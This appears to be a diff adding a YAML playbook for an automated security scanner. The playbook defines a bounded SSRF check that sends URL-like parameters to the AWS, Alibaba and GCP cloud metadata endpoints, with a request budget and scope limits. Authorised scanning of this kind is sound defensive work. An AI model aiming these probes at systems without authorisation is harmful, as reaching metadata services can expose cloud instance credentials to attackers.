@@ -1,0 +1,51 @@
+id: ssrf_cloud_metadata
+attack_class: ssrf
+preconditions:
+  methods: ["GET", "POST"]
+  parameter_name_contains_any: ["url", "endpoint", "callback", "redirect", "webhook", "src", "href", "fetch", "load"]
+steps:
+  - id: aws_metadata_probe
+    action: send_ssrf_metadata_get
+    identity_selector: none
+    probe_template:
+      mode: bounded_probe
+      template: ssrf_url_parameter
+      allowed_methods: ["GET"]
+      variables:
+        target: "http://169.254.169.254/latest/meta-data/"
+    expected_signal: cloud metadata marker is reflected through server-side fetch
+    validator: ssrf_metadata_validator
+    max_attempts: 1
+  - id: alibaba_metadata_probe
+    action: send_ssrf_metadata_get
+    identity_selector: none
+    probe_template:
+      mode: bounded_probe
+      template: ssrf_url_parameter
+      allowed_methods: ["GET"]
+      variables:
+        target: "http://100.100.100.200/"
+    expected_signal: cloud metadata marker is reflected through server-side fetch
+    validator: ssrf_metadata_validator
+    max_attempts: 1
+  - id: gcp_metadata_probe
+    action: send_ssrf_metadata_get
+    identity_selector: none
+    probe_template:
+      mode: bounded_probe
+      template: ssrf_url_parameter
+      allowed_methods: ["GET"]
+      variables:
+        target: "http://metadata.google.internal/"
+    expected_signal: cloud metadata marker is reflected through server-side fetch
+    validator: ssrf_metadata_validator
+    max_attempts: 1
+validators:
+  ssrf_metadata_validator:
+    signal: metadata_marker
+safety_budget:
+  max_requests: 3
+  max_attempts_per_step: 1
+  rate_limit_rps: 0.5
+  scope: current_endpoint
+  proof_gate: default
